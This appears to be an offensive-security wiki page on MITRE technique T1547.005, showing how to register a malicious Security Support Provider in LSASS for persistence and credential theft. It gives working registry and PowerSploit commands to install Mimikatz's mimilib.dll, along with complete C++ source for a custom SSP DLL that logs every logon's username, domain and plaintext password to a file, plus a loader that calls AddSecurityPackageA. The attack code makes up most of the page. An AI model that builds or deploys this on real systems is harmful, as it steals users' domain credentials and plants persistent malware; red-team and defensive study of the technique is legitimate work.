---
description: >-
  MITRE ATT&CK™ Boot or Logon Autostart Execution: Security Support Provider -
  Technique T1547.005
---

# Security Support Provider DLLs

## Theory

We may abuse [security support providers (SSPs)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

## Practice

{% hint style="danger" %}
We won't be able to make it work If [LSA protection (RunAsPPL)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#enable-by-using-the-registry) is enabled. Loaded SSP DLLs will have to be signed by Microsoft as LSASS.exe will run as a [Protected Process Light (PPL)](https://learn.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-#system-protected-process).
{% endhint %}

We may modify LSA Registry keys to add new SSPs which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. The SSP configuration is stored in this two Registry keys:

* `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`
* `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages`.&#x20;

{% tabs %}
{% tab title="Mimikatz" %}
The [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases) project provides a DLL file (mimilib.dll) that can be used as a malicious SSP DLL that will log credentials in this file:

```powershell
C:\Windows\System32\kiwissp.log 
```

First, you will have to copy mimilib.dll in System32

```powershell
copy C:\Windows\Temp\mimilib.dll C:\Windows\System32\mimilib.dll
```

Then, edit LSA registry keys to include the new security support provider

```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
```
{% endtab %}

{% tab title="PowerSploit" %}
[PowerSploit](https://attack.mitre.org/software/S0194)'s `Install-SSP` Persistence module can be used to install a SSP DLL.

```powershell
Import-Module .\PowerSploit.psm1
Install-SSP -Path .\mimilib.dll
```
{% endtab %}

{% tab title="Custom DLL" %}
Below is the code, originally taken from [mimikatz](https://github.com/gentilkiwi/mimikatz), adapted and refactored, that we can compile as our own Security Support Provider DLL. It intercepts authenticatin details and saves them to a file `c:\temp\lsa-pwned.txt`:

{% code title="sspcutsom.cpp" %}
```cpp
#include "stdafx.h"
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <iostream>
#pragma comment(lib, "Secur32.lib")

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }
NTSTATUS NTAPI SpShutDown(void) { return 0; }

NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
	PackageInfo->Name = (SEC_WCHAR *)L"SSPCustom";
	PackageInfo->Comment = (SEC_WCHAR *)L"SSPCustom <o>";
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wRPCID = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->wVersion = 1;
	return 0;
}

NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	HANDLE outFile = CreateFile(L"c:\\temp\\lsa-pwned.txt", FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD bytesWritten = 0;
	
	std::wstring log = L"";
	std::wstring account = AccountName->Buffer;
	std::wstring domain = PrimaryCredentials->DomainName.Buffer;
	std::wstring password = PrimaryCredentials->Password.Buffer;

	log.append(account).append(L"@").append(domain).append(L":").append(password).append(L"\n");
	WriteFile(outFile, log.c_str(), log.length() * 2, &bytesWritten, NULL);
	CloseHandle(outFile);
	return 0;
}

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = 
{
	{
		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,	SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL 
	}
};

// SpLsaModeInitialize is called by LSA for each registered Security Package
extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = SecurityPackageFunctionTable;
	*pcTables = 1;
	return 0;
}
```
{% endcode %}

Then, here is a code that loads the malicious SSP custom.dll:

{% code title="load_ssp.cpp" %}
```cpp
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#pragma comment(lib, "Secur32.lib")

int main()
{
	SECURITY_PACKAGE_OPTIONS spo = {};
	SECURITY_STATUS ss = AddSecurityPackageA((LPSTR)"c:\\temp\\sspcutsom.dll", &spo);
	return 0;
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

### In-memory DLL injection - Credential Access

We may directly inject [SSP DLLs](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) into memory. It prevent us from editing registries but using this approach, it will not persist accross reboots.

{% content-ref url="../../../ad/movement/credentials/dumping/lsass/security-support-provider-dlls.md" %}
[security-support-provider-dlls.md](../../../ad/movement/credentials/dumping/lsass/security-support-provider-dlls.md)
{% endcontent-ref %}

## Resources

{% embed url="https://attack.mitre.org/techniques/T1547/005/" %}

{% embed url="https://pentestlab.blog/2019/10/21/persistence-security-support-provider/" %}

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package" %}
